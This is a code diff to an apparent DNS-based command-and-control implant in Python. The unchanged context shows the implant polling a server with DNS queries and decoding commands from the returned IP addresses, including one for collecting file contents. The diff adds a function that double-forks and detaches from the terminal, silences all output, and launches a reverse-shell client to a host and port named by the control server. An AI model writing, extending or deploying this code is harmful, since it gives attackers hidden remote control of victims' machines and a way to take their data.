@@ -72,6 +72,45 @@ def resolveFileName(ips):
         fileName = fileName + chr(int(character))
         
     return fileName
+    
+def spawnRevShell(host, port):
+    pid = os.fork()
+    if pid > 0:
+        # Parent returns immediately; 'pid' is the first child's PID (not the final worker)
+        sys.stdout.write("Spawned intermediate PID %d\n" % pid)
+        return pid
+
+    # First child
+    os.setsid()          # new session, detach from TTY
+    pid2 = os.fork()
+    if pid2 > 0:
+        # First child exits; grandchild gets re-parented to init/systemd
+        os._exit(0)
+
+    # Grandchild: become the daemonized worker
+    try:
+        os.chdir("/")
+        os.umask(0)
+
+        # Close inherited FDs (except stdio). Redirect stdio to /dev/null.
+        try:
+            maxfd = os.sysconf("SC_OPEN_MAX")
+        except (AttributeError, ValueError):
+            maxfd = 256
+        for fd in range(3, maxfd):
+            try: os.close(fd)
+            except OSError: pass
+
+        devnull = os.open("/dev/null", os.O_RDWR)
+        os.dup2(devnull, 0)
+        os.dup2(devnull, 1)
+        os.dup2(devnull, 2)
+
+        cmd = ("python3", "shellClient.py", host, port)
+        os.execvp(cmd[0], cmd)
+    except Exception as e:
+        os.write(2, ("exec failed: %s\n" % e).encode("utf-8"))
+        os._exit(127)
 
 sock = formSocket()
 sock.sendto(makeQuery("supportcenter.net"), (SERVER, 53))
@@ -106,6 +145,7 @@ while True:
             
             if not ((address == "100.100.100.100") and (port == 100)):
                 print("Sending shell to " + address + ":" + str(port)) 
+                spawnRevShell(address, str(port))
         elif(ipSplit[3] == "85"): 
             print("Collecting file contents")
             
